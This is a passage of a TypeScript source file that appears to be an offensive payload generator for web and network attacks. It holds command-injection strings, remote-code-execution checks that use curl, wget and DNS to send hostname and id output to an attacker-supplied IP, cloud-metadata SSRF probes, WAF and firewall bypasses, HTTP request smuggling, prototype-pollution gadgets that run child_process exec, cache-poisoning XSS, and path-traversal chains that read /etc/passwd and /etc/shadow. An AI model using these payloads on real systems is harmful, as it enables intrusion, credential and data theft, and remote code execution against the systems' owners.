    `;${cmd.replace(/ /g,'${IFS}')}`,
    `|${cmd.replace(/ /g,'${IFS}')}`,
    /* b64 decode injection */
    `;{echo,${B64}}|{base64,-d}|{bash,}`,
    `|{echo,${B64}}|{base64,-d}|{bash,}`,
    `$(bash<<<$(echo${"\t"}${B64}|base64${"\t"}-d))`,
    /* printf decode injection */
    `;eval$(printf '${HEX}')`,
    `|eval$(printf '${HEX}')`,
    /* Windows injection */
    `&${cmd}&`,
    `|${cmd}|`,
    `\r\n${cmd}`,
    /* HTTP header injection */
    `\r\nX-Injected: ${cmd}`,
    /* LDAP injection */
    `)(${cmd})(`,
    /* XPath injection */
    `' or '1'='1`,
    /* SSTI generic */
    `${'{'}7*7${'}'}`  ,
    `{{7*7}}`,
    `<%= 7*7 %>`,
    `#{7*7}`,
  ].filter((v,i,a)=>a.indexOf(v)===i); // deduplicate
}


/* ── Injection-ready self-contained RCE scanner ─────────────────────────── */
export function buildScanningPayloads(attackerIp: string, attackerPort: string): string[] {
  return [
    /* DNS callback (canary) */
    `nslookup $(hostname).canary.${attackerIp} 2>/dev/null`,
    `dig +short $(hostname).nx.${attackerIp} 2>/dev/null`,
    `curl -sk "http://${attackerIp}:${attackerPort}/c/$(hostname)/$(whoami)" 2>/dev/null`,
    `wget -qO- "http://${attackerIp}:${attackerPort}/c/$(hostname)/$(id|base64 -w0)" 2>/dev/null`,
    /* Time-based blind */
    `sleep 7`,
    `ping -c 7 127.0.0.1 >/dev/null 2>&1`,
    `python3 -c "import time;time.sleep(7)" 2>/dev/null`,
    `perl -e "sleep 7" 2>/dev/null`,
    `node -e "setTimeout(()=>{},7e3)" 2>/dev/null`,
    `ruby -e "sleep 7" 2>/dev/null`,
    /* Verify RCE */
    `id;whoami;hostname;uname -a`,
    `id && curl -sk "http://${attackerIp}:${attackerPort}/rce/$(id|base64 -w0)" 2>/dev/null`,
    `whoami && wget -qO- "http://${attackerIp}:${attackerPort}/rce/$(whoami)" 2>/dev/null`,
    /* Network connectivity check */
    `curl -sk -m3 "http://${attackerIp}:${attackerPort}/" 2>/dev/null && echo CONNECTED`,
    `ping -c1 ${attackerIp} 2>/dev/null && echo REACHABLE`,
    /* Output to HTTP */
    `curl -sk "http://${attackerIp}:${attackerPort}/x?q=$(id 2>&1|base64 -w0)" 2>/dev/null`,
    `wget -qO- "http://${attackerIp}:${attackerPort}/x?q=$(uname -a 2>&1|base64 -w0)" 2>/dev/null`,
    /* DNS exfil channel */
    `for w in $(id|tr ' ' '\n'|head -5); do dig +short "$w.nx.${attackerIp}" 2>/dev/null; done`,
    /* SSRF probe */
    `curl -sk "http://169.254.169.254/latest/meta-data/" 2>/dev/null && echo AWS_IMDS`,
    `curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null && echo GCP_IMDS`,
    `curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null && echo AZURE_IMDS`,
  ];
}

export interface BypassPayload {
  technique: string;
  category:  string;
  os:        string;
  command:   string;
  notes:     string;
}

export function buildWebApplicationBypass(target: string): BypassPayload[] {
  return [
    { technique:"WAF bypass via HTTP/2 request smuggling", category:"waf", os:"any",
      command:`python3 -c "
import socket,ssl
host='${target}'
ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
s=ctx.wrap_socket(socket.socket(),server_hostname=host)
s.connect((host,443))
# H2 preface + request with smuggled H1 body
preface=b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
s.send(preface)
print(s.recv(4096))
" 2>/dev/null`,
      notes:"HTTP/2 cleartext with embedded H1 smuggling prefix. Many WAFs inspect H1 only." },
    { technique:"WAF bypass via Unicode normalization", category:"waf", os:"any",
      command:`# Unicode lookalike bypass: UNION → ｕｎｉｏｎ, SELECT → ｓｅｌｅｃｔ\n_PAYLOAD=$(python3 -c "print('\\uff55\\uff4e\\uff49\\uff4f\\uff4e \\uff33\\uff25\\uff2c\\uff25\\uff23\\uff34')")\ncurl -sk "http://${target}/search?q='+$_PAYLOAD+1--" 2>/dev/null`,
      notes:"Full-width Unicode chars normalize to ASCII in DB but bypass WAF regex. Effective against ModSecurity/Cloudflare." },
    { technique:"WAF bypass via chunked transfer encoding", category:"waf", os:"any",
      command:`python3 -c "
import socket
s=socket.create_connection(('${target}',80),5)
payload=b'GET / HTTP/1.1\r\nHost: ${target}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nHELLO\r\n0\r\n\r\n'
s.send(payload)
print(s.recv(2048).decode(errors='replace'))
" 2>/dev/null`,
      notes:"Dual Transfer-Encoding headers confuse proxies. TE.CL and CL.TE desync for request smuggling." },
    { technique:"Origin IP exposure bypass (CDN/WAF direct)", category:"waf", os:"any",
      command:`python3 -c "
import socket,struct,subprocess
# Find real origin: check Certificate Transparency, DNS history, ARIN
ct=subprocess.check_output(['curl','-sk','https://crt.sh/?q=${target}&output=json'],timeout=10).decode()[:3000]
print('CT records:',ct)
# Try common origin IPs
for h in ['${target}','origin.${target}','direct.${target}']:
  try:
    ip=socket.gethostbyname(h)
    print(f'{h} -> {ip}')
  except: pass
" 2>/dev/null`,
      notes:"Bypass CDN/WAF by hitting origin server directly. Find via CT logs, DNS history, email headers, Shodan." },
  ];
}

export function buildNetworkBypass(target: string): BypassPayload[] {
  return [
    { technique:"Firewall bypass via IPv6 (dual-stack target)", category:"network", os:"linux",
      command:`ping6 -c1 "${target}" 2>/dev/null && nmap -6 --open -p 22,80,443,3306,5432,6379,27017 "${target}" 2>/dev/null || echo "No IPv6"`,
      notes:"Many firewall rules are IPv4-only. IPv6 dual-stack hosts often allow same ports unrestricted." },
    { technique:"Port knocking sequence probe + bypass", category:"network", os:"linux",
      command:`for port in 1234 5678 9012 22; do nmap -Pn -p $port --open --host-timeout 1s "${target}" 2>/dev/null; sleep 0.5; done && ssh "${target}" 2>/dev/null`,
      notes:"Port knocking: sends connection attempts to sequence of ports to trigger firewall rule to open SSH." },
    { technique:"VLAN hopping via double-tagging (trunk port)", category:"network", os:"linux",
      command:`# Double-tagged VLAN frame injection (requires raw socket + scapy)\npython3 -c "from scapy.all import *; sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst='${target}')/TCP(dport=22,flags='S'),iface='eth0',count=3)" 2>/dev/null`,
      notes:"Double 802.1Q tagging to hop into target VLAN. Only works from trunk port. Linux requires CAP_NET_RAW." },
  ];
}

export function buildAllBypassPayloads(target: string): BypassPayload[] {
  return [
    ...buildWebApplicationBypass(target),
    ...buildNetworkBypass(target),
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   HTTP REQUEST SMUGGLING — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE
   ═══════════════════════════════════════════════════════════════════════════ */
export interface SmuggleResult {
  technique:   string;
  frontHeaders: Record<string, string>;
  rawRequest:   string;
  notes:        string;
}

export function buildHttpSmuggling(host: string, path: string, poisonPayload: string): SmuggleResult[] {
  const results: SmuggleResult[] = [];

  const innerGet =
    `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nX-Smuggled: 1\r\n\r\n`;

  const clTeBody = `0\r\n\r\n${poisonPayload}`;
  results.push({
    technique: "CL.TE (front: Content-Length wins, back: Transfer-Encoding wins)",
    frontHeaders: {
      "Content-Length": String(clTeBody.length),
      "Transfer-Encoding": "chunked",
    },
    rawRequest:
      `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
      `Content-Type: application/x-www-form-urlencoded\r\n` +
      `Content-Length: ${clTeBody.length}\r\n` +
      `Transfer-Encoding: chunked\r\n\r\n` +
      clTeBody,
    notes:
      "Front proxy uses CL, backend uses TE. Body suffix becomes prefix of next victim request.",
  });

  const innerLen  = Buffer.byteLength(innerGet);
  const teClChunk = innerLen.toString(16).toUpperCase();
  const teClBody  = `${teClChunk}\r\n${innerGet}\r\n0\r\n\r\n`;
  results.push({
    technique: "TE.CL (front: Transfer-Encoding wins, back: Content-Length wins)",
    frontHeaders: {
      "Transfer-Encoding": "chunked",
      "Content-Length": String(teClBody.length - 5),
    },
    rawRequest:
      `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
      `Content-Type: application/x-www-form-urlencoded\r\n` +
      `Transfer-Encoding: chunked\r\n` +
      `Content-Length: ${teClBody.length - 5}\r\n\r\n` +
      teClBody,
    notes:
      "Front proxy uses TE (reads full chunked body), backend uses CL (reads partial) — leftover is prepended to next request.",
  });

  const teTeVariants: Array<[string, string]> = [
    ["Transfer-Encoding", "xchunked"],
    ["Transfer-Encoding", "chunked, identity"],
    ["Transfer-Encoding", "CHUNKED"],
    ["X-Transfer-Encoding", "chunked"],
    ["Transfer-Encoding ", "chunked"],
    ["Transfer-Encoding:", "chunked"],
  ];
  for (const [hdr, val] of teTeVariants) {
    results.push({
      technique: `TE.TE obfuscation — header "${hdr}: ${val}"`,
      frontHeaders: { "Transfer-Encoding": "chunked", [hdr]: val },
      rawRequest:
        `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
        `Transfer-Encoding: chunked\r\n${hdr}: ${val}\r\n` +
        `Content-Length: ${clTeBody.length}\r\n\r\n` + clTeBody,
      notes:
        "Both front and back support TE but one deobfuscates the variant differently — desync occurs at the ambiguity.",
    });
  }

  results.push({
    technique: "H2.CL — HTTP/2 to HTTP/1 downgrade with CL injection",
    frontHeaders: { ":method": "POST", ":path": path, ":scheme": "https", ":authority": host, "content-length": "0" },
    rawRequest:
      `POST ${path} HTTP/2\r\nHost: ${host}\r\ncontent-length: 0\r\n\r\n` +
      `GET /smuggled HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 5\r\n\r\nsmggl`,
    notes:
      "HTTP/2 request downgraded to HTTP/1.1 by front-end; injected CL header creates smuggle prefix on backend connection.",
  });

  results.push({
    technique: "H2.TE — HTTP/2 with Transfer-Encoding header smuggled through",
    frontHeaders: { ":method": "POST", ":path": path, "transfer-encoding": "chunked" },
    rawRequest:
      `POST ${path} HTTP/2\r\nHost: ${host}\r\ntransfer-encoding: chunked\r\n\r\n` +
      `0\r\n\r\nGET /poison HTTP/1.1\r\nHost: ${host}\r\nFoo: bar`,
    notes:
      "HTTP/2 prohibits TE header but some frontends forward it; backend treats it as chunked, desync follows.",
  });

  results.push({
    technique: "CRLF injection in header value to smuggle second request",
    frontHeaders: {
      "X-Forwarded-For": `127.0.0.1\r\nTransfer-Encoding: chunked`,
    },
    rawRequest:
      `GET ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
      `X-Forwarded-For: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n` +
      `0\r\n\r\n${poisonPayload}`,
    notes:
      "If front-end passes X-Forwarded-For value verbatim, embedded CRLF injects TE header into backend request.",
  });

  results.push({
    technique: "Header-based request tunneling (SSRF via smuggle)",
    frontHeaders: { "Host": `${host}\r\nHost: internal-admin.local` },
    rawRequest:
      `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nHost: internal-admin.local\r\n\r\n`,
    notes:
      "Duplicate Host headers; some frontends forward both. Backend may route based on second Host value allowing SSRF to internal services.",
  });

  return results;
}

/* ═══════════════════════════════════════════════════════════════════════════
   PROTOTYPE POLLUTION — JSON body / query / URL / __proto__ / constructor
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildPrototypePollutionPayloads(gadget = "exec", cmd = "id"): string[] {
  const payloads: string[] = [];

  const jsonProto = (key: string, val: unknown) =>
    JSON.stringify({ "__proto__": { [key]: val }, "constructor": { "prototype": { [key]: val } } });

  payloads.push(jsonProto("isAdmin", true));
  payloads.push(jsonProto("role", "admin"));
  payloads.push(jsonProto("authenticated", true));
  payloads.push(jsonProto("__proto__", { "isAdmin": true, "role": "admin" }));
  payloads.push(jsonProto("toString", { "value": `function(){return '${cmd}';}` }));

  if (gadget === "exec" || gadget === "rce") {
    payloads.push(jsonProto("shell", "/bin/bash"));
    payloads.push(jsonProto("env", { "NODE_OPTIONS": `--require /dev/stdin`, "NODE_EXTRA_CA_CERTS": `/dev/stdin` }));
    payloads.push(JSON.stringify({ "__proto__": { "shell": "node", "input": `process.mainModule.require('child_process').exec('${cmd}')` } }));
    payloads.push(JSON.stringify({ "__proto__": { "type": "Program", "body": [{ "type": "MustacheStatement", "path": { "type": "PathExpression", "original": "constructor" }, "params": [{ "type": "StringLiteral", "value": `return process.mainModule.require('child_process').exec('${cmd}')` }] }] } }));
    payloads.push(JSON.stringify({
      "__proto__": {
        "outputFunctionName": `_tmp1;global.process.mainModule.require('child_process').execSync('${cmd}');var __tmp2`,
      }
    }));
    payloads.push(JSON.stringify({
      "__proto__": {
        "escapeFunction": `1;return global.process.mainModule.require('child_process').execSync('${cmd}').toString()//`,
      }
    }));
    payloads.push(JSON.stringify({ "__proto__": { "execPath": cmd, "NODE_OPTIONS": "--inspect=0.0.0.0:9229" } }));
  }

  const urlVariants = [
    `?__proto__[isAdmin]=true&constructor[prototype][role]=admin`,
    `?__proto__.isAdmin=true&constructor.prototype.role=admin`,
    `?__proto__[shell]=/bin/bash&__proto__[env][NODE_OPTIONS]=--require+/dev/stdin`,
    `?a[__proto__][isAdmin]=1&a[__proto__][role]=admin`,
    `?__proto__[outputFunctionName]=_nx;require('child_process').exec('${cmd}');var _nx2`,
  ];
  payloads.push(...urlVariants);

  const dotNotation = [
    `constructor.prototype.isAdmin=true`,
    `__proto__.isAdmin=true&__proto__.role=admin`,
    `__proto__[isAdmin]=1&__proto__[role]=admin&__proto__[authenticated]=1`,
  ];
  payloads.push(...dotNotation);

  return payloads;
}

/* ═══════════════════════════════════════════════════════════════════════════
   CACHE POISONING — via Host, X-Forwarded-Host, X-Forwarded-Scheme, etc.
   ═══════════════════════════════════════════════════════════════════════════ */
export interface CachePoisonResult {
  technique:    string;
  headers:      Record<string, string>;
  xssPayload?:  string;
  notes:        string;
}

export function buildCachePoisoningPayloads(host: string, injectHost: string, xssPayload = `"><script>alert(document.domain)</script>`): CachePoisonResult[] {
  return [
    {
      technique: "Host header injection → reflected in Location / canonical URL",
      headers: { "Host": injectHost, "X-Forwarded-Host": injectHost },
      xssPayload,
      notes: "If app caches page with injected Host, all users receive poisoned response with attacker domain in links/redirects.",
    },
    {
      technique: "X-Forwarded-Host → reflected in meta canonical / og:url",
      headers: { "Host": host, "X-Forwarded-Host": `${injectHost}"><script>alert(1)</script>` },
      xssPayload,
      notes: "Unsanitised X-Forwarded-Host reflected in HTML meta tags; once cached, triggers stored XSS for all visitors.",
    },
    {
      technique: "X-Forwarded-Scheme: http → HTTPS→HTTP downgrade in Location",
      headers: { "Host": host, "X-Forwarded-Scheme": "http", "X-Forwarded-Host": injectHost },
      notes: "Forces redirect to HTTP allowing MITM on cached redirect; also useful for bypassing HTTPS-only WAF rules.",
    },
    {
      technique: "Unkeyed header: X-Original-URL path override",
      headers: { "Host": host, "X-Original-URL": `/admin`, "X-Rewrite-URL": `/admin` },
      notes: "Cache key uses visible URL, but app routes to X-Original-URL. Cache serves /admin response for / to all users.",
    },
    {
      technique: "Cache-key confusion via port in Host",
      headers: { "Host": `${host}:1337`, "X-Forwarded-Port": "1337" },
      notes: "Cache key ignores port; app reflects it in absolute URLs. Poison the portless cache entry.",
    },
    {
      technique: "Fat GET — body params reflected, cache key is GET URL only",
      headers: { "Host": host, "Content-Type": "application/x-www-form-urlencoded", "Content-Length": xssPayload.length.toString() },
      xssPayload,
      notes: "Some frameworks merge GET+body params. Cache key = URL only, so poisoned body value gets cached.",
    },
    {
      technique: "Vary: Origin bypass — null origin accepted and cached",
      headers: { "Host": host, "Origin": "null" },
      notes: "If server caches CORS response for Origin:null and returns Access-Control-Allow-Origin:null, attacker sandboxed iframe can send credentialed requests.",
    },
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   PATH TRAVERSAL + INJECTION CHAINS
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildPathTraversalChains(cmd: string): string[] {
  const enc  = (s: string) => encodeURIComponent(s);
  const denc = (s: string) => encodeURIComponent(encodeURIComponent(s));
  const uni  = (s: string) => s.split("").map(c => c === "/" ? "%c0%af" : c).join("");
  const back = "../".repeat(8);
  const etcp = "/etc/passwd";

  return [
    `${back}etc/passwd`,
    `${back}etc/shadow`,
    `${back}proc/self/environ`,
    `${back}proc/self/cmdline`,
    `....//....//....//....//etc/passwd`,
    `..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`,
    `..%252F..%252F..%252F..%252Fetc%252Fpasswd`,
    denc(`../../../../etc/passwd`),
    uni(`../../../../etc/passwd`),
    `%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`,
    `....\\....\\....\\....\\etc\\passwd`,
    `..\\..\\..\\..\\windows\\win.ini`,
    `..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
    `${back}windows\\system32\\cmd.exe?/c+${enc(cmd)}`,
    `${back}bin/sh?-c+${enc(cmd)}`,
    `/var/log/nginx/access.log`,
    `/var/log/apache2/access.log`,
    `/proc/self/fd/1`,
    `php://filter/convert.base64-encode/resource=/etc/passwd`,
    `php://filter/read=string.rot13/resource=/etc/passwd`,
    `php://input`,
    `data://text/plain;base64,${Buffer.from(`<?php system('${cmd}'); ?>`).toString("base64")}`,
    `expect://${cmd}`,
    `zip://tmp/nx.zip%23nx.php`,
    `phar://tmp/nx.phar/nx.php`,
    `/etc/passwd%00.jpg`,
    `/etc/passwd\x00.jpg`,
    `${etcp}%00`,
    `${etcp}%00.html`,
    `${etcp}%0a`,
    `${back}etc/passwd%0aContent-Type: text/html%0a%0a<script>alert(1)</script>`,
  ];
}
